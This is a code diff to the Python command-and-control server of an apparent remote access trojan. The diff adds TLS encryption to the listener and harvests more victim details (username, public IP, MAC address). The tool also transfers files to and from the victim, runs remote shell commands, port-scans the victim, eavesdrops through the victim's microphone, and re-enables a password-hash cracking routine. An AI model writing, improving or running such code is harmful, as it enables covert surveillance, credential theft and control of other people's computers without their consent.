@@ -7,26 +7,39 @@ import cv2
 import pickle
 import struct
 import nmap
-
-# import crypt
+import ssl
+import ntpath
+import crypt
 from colorama import Fore
 import threading
 import pyaudio
 
-Host = "192.168.11.104"
+Host = "100.94.242.9" #100.94.241.129
 Port = 4444
 Buff = 1024
 connected_address = []
 server_socket = None
 desktop_name = None
 operating_system = None
+mac_address = None
+ip_address = None
+user_name = None
+
 
 
 def CreateSocket():
     global server_socket
     try:
-        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        plain_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        plain_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+        # Create an SSL context
+        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+        context.load_cert_chain(certfile='server.crt', keyfile='server.key')
+
+        # Wrap the plain socket with SSL
+        server_socket = context.wrap_socket(plain_socket, server_side=True)
+        print("Secure socket created successfully")
 
     except socket.error as msg:
         print("Error code:" + str(msg))
@@ -57,33 +70,32 @@ def AcceptConnection():
 
 
 def ListConnection():
-    global connected_address, connected_address
+    global connected_address, desktop_name, operating_system, mac_address, ip_address, user_name, processor
     print("     Connected Client:")
     print("  ------------------------")
     try:
-        print(f"  IP Address:        {connected_address[0]}")
-        print(f"  Port:              {connected_address[1]}")
-        print(f"  MAC Address:       {mac_address}")
-        print(f"  Operating System:  {operating_system}")
-        print(f"  Desktop Name:      {desktop_name}")
+        print(f"  Local IP Address:    {connected_address[0]}")
+        print(f"  Port:                {connected_address[1]}")
+        print(f"  Desktop Name:        {desktop_name}")
+        print(f"  Operating System:    {operating_system}")
+        print(f"  MAC Address:         {mac_address}")
+        print(f"  User Name:           {user_name}")
+        print(f"  Public IP Address:   {ip_address}")
     except socket.error as msg:
         print("  Error receiving info:", msg)
 
 
 def receive_info(connected_socket):
-    global desktop_name, operating_system, mac_address
+    global desktop_name, operating_system, mac_address, ip_address, user_name, system_architecture, processor
     try:
         info = connected_socket.recv(Buff).decode("utf-8")
         data = info.split(',')
-        if len(data) == 3:
-            desktop_name, operating_system, mac_address = data
+        if len(data) == 5:
+            desktop_name, operating_system, mac_address, ip_address, user_name = data
         else:
             print("Invalid data format received from client.")
     except Exception as e:
         print("Error receiving info:", e)
-
-
-
 
 
 def receive_file(filename, connected_socket):
@@ -96,7 +108,6 @@ def receive_file(filename, connected_socket):
             # Receive file size using struct
             size_bytes = connected_socket.recv(4)
             file_size = struct.unpack(">L", size_bytes)[0]
-
             full_path = os.path.join(save_directory, filename)
             received_size = 0  # Initialize received_size to track received data
             with open(full_path, "wb") as file:
@@ -116,7 +127,7 @@ def receive_file(filename, connected_socket):
 def send_file(filename):
     global connected_socket
     file_size = os.path.getsize(filename)
-    connected_socket.send(str(file_size).encode("utf-8"))
+    connected_socket.send(struct.pack(">L", file_size))
     time.sleep(1)
     try:
         with open(filename, "rb") as file:
@@ -134,9 +145,9 @@ def RunCommand():
     while True:
         try:
             path()
-            if connected_socket.fileno() == -1:
-                print("Client disconnected.")
-                break
+            #if connected_socket.fileno() == -1:
+                #print("Client disconnected.")
+                #break
             command = input()
             connected_socket.send(command.encode("utf-8"))
             if command.lower() == 'q':
@@ -230,7 +241,7 @@ def scan(target):
                 print('Port : %s\tState : %s\tService : %s\tVersion : %s' % (port, state, service, version))
 
 
-"""def cryptCrack(file):
+def cryptCrack(file):
     try:
         passwordFile = open(file, 'r')
     except FileNotFoundError:
@@ -255,7 +266,7 @@ def scan(target):
             print(Fore.RESET)  # Reset color to default
 
         dictionary.close()
-    passwordFile.close()"""
+    passwordFile.close()
 
 audio_record = False
 
@@ -359,11 +370,8 @@ def menu():
             while True:
                 # try:
                 filename = input("Enter file path to download (or type 'back' to return to menu):")
-                """except KeyboardInterrupt:
-                    print("\nOperation interrupted. Returning to menu.")
-                    break"""
-
                 connected_socket.send(filename.encode("utf-8"))
+                filename = ntpath.basename(filename)
                 if filename.lower() == "back":
                     break
                 receive_file(filename, connected_socket)
@@ -371,15 +379,15 @@ def menu():
         elif choice.lower() == "upload":
             filename = input("Enter file path to upload : ")
             if os.path.exists(filename):
+                connected_socket.send("yes".encode("utf-8"))
                 name = os.path.basename(filename)
-                connected_socket.send(name.encode())
+                connected_socket.send(name.encode("utf-8"))
                 send_file(filename)
                 print("File sent successfully")
 
-
-
             else:
-                print("File does not exist. Please enter a valid file path or type 'back' to quit.")
+                connected_socket.send("no".encode("utf-8"))
+                print("File does not exist. ")
 
         elif choice.lower() == "cmd":
             RunCommand()
@@ -415,7 +423,8 @@ def menu():
         elif choice.lower() == "shutdown":
             print("[+] Shutting down ...")
         elif choice.lower() == "portscanner":
-            ipaddress = connected_socket.recv(1024).decode("utf-8")
+            print("[+] Scanning ...")
+            ipaddress = connected_address[0]
             scan(ipaddress)
         elif choice.lower() == "send_message":
             text = str(input("Enter the text: "))
@@ -520,7 +529,7 @@ def menu():
                 print("Invalid input. Please enter a valid number of seconds.")
         elif choice == "bruteforce":
             file = input("Enter user:pass_hashed file: ")
-            # cryptCrack(file)
+            cryptCrack(file)
         elif choice == "audiostart":
             print("Listening for audio stream from client...")
             audio_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -534,7 +543,6 @@ def menu():
             audio_record = False
             audio_thread.join()
             audio_connection.close()
-            print("adio donnnnne")
         elif choice.lower() == "exit":
             print("[+] Exiting ...")
             connected_socket.close()  # Close the connection with the client
